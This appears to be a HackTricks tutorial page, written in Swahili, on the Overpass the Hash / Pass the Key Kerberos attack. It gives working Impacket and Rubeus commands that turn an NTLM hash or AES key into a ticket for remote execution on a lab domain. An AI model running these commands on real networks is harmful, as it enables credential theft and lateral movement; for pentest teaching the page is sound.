# Over Pass the Hash/Pass the Key

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Overpass The Hash/Pass The Key (PTK)

Shambulio la **Overpass The Hash/Pass The Key (PTK)** limeundwa kwa mazingira ambapo itifaki ya kawaida ya NTLM imezuiliwa, na uwakala wa uthibitishaji wa Kerberos unachukua kipaumbele. Shambulio hili hutumia hash ya NTLM au funguo za AES za mtumiaji kupata tiketi za Kerberos, kuruhusu ufikiaji usiohalali wa rasilimali ndani ya mtandao.

Kutekeleza shambulio hili, hatua ya kwanza inahusisha kupata hash ya NTLM au nenosiri la akaunti ya mtumiaji anayelengwa. Baada ya kupata habari hii, Tiketi ya Kuidhinisha Tiketi (TGT) kwa akaunti inaweza kupatikana, kuruhusu mkaidi kupata huduma au mashine ambazo mtumiaji ana ruhusa.

Mchakato unaweza kuanzishwa na amri zifuatazo:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Kwa matukio yanayohitaji AES256, chaguo la `-aesKey [ufunguo wa AES]` linaweza kutumika. Zaidi ya hayo, tiketi iliyopatikana inaweza kutumika na zana mbalimbali, ikiwa ni pamoja na smbexec.py au wmiexec.py, kueneza wigo wa shambulio.

Matatizo yanayokutana kama vile _PyAsn1Error_ au _KDC haitaweza kupata jina_ kawaida hutatuliwa kwa kuboresha maktaba ya Impacket au kutumia jina la mwenyeji badala ya anwani ya IP, kuhakikisha utangamano na KDC ya Kerberos.

Mfululizo mbadala wa amri ukitumia Rubeus.exe unaonyesha upande mwingine wa mbinu hii:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Hii njia inafanana na **Pass the Key** approach, ikilenga kuchukua na kutumia tiketi moja kwa moja kwa madhumuni ya uwakilishi. Ni muhimu kuzingatia kwamba kuanzisha ombi la TGT husababisha tukio `4768: Tiketi ya uthibitishaji wa Kerberos (TGT) ilihitajika`, ikionyesha matumizi ya RC4-HMAC kwa chaguo-msingi, ingawa mifumo ya Windows ya kisasa hupendelea AES256.

Ili kuzingatia usalama wa uendeshaji na kutumia AES256, amri ifuatayo inaweza kutumika:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Marejeo

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionyeshwa kwenye HackTricks**? au ungependa kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) **kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
